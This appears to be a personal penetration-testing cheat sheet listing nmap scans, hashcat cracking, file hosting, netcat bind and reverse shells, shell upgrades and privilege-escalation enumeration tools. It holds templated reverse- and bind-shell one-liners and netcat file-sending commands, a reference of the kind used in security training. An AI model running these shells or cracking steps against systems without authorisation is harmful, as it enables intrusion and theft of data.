# Basic Tools

## Target Scan

### Nmap

```bash
nmap -sC -sV -oA <location> <ip>
nmap -v -p- -A <ip>
```

## Fuzz & Crack

### Hashcat

```bash
hashcat -m <mode> <hash.txt> <wordlist.txt>
```

Create your own wordlist:

```bash
hashcat --force <passwords.txt> -r <best64.rule> --stdout
```

{% hint style="info" %}
Find rules in _/usr/share/hashcat/rules/_
{% endhint %}

### ffuf

[Fuzz Faster U Fool](https://github.com/ffuf/ffuf). I guess that replaces Hydra and wfuzz.

## Hosting

### Host a file locally

```bash
python2 -m SimpleHTTPServer <port>
python3 -m http.server <port>
```

## Shells

### nc

> TCP/IP Swiss army knife\#

```bash
# Listen  
nc -nlvp <port>
nc -nlvp <port> > <incoming_file>   # redirect incoming input

# Connect
nc -nv <ip> <port>
nc -nv <ip> <port> < <push_file>    # send a file
```

**Reverse Shells**

Bob \(Windows\) dicrectly connected to Internet, Alice \(Linux\) behind NAT.

_Bind Shell_

```bash
# Bob can create a nc server and serve make clients connect to his shell
nc -nlvp <port> -e cmd.exe

# Alice can then connect to it
```

_Reverse Shell_

```bash
# Alice cannot bind port locally and expect Bob to connect (because NAT)
# Alice can instead send shell to Bob (Bob needs to setup nc server)

nc -nv <ip> <port> -e /bin/bash
```

More: [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

_Getting a nicer prompt_

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
<C-z>
stty raw -echo
fg
```

```bash
script -c "/bin/bash -i" /dev/null
```

## PrivEsc

### Enumeration Scripts

* [LinPeas.sh / WinPeas.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
* [Seatbelt](https://github.com/GhostPack/Seatbelt) \(for Windows\)

### Monitoring

* [pspy](https://github.com/DominicBreuker/pspy) - proccess snooping

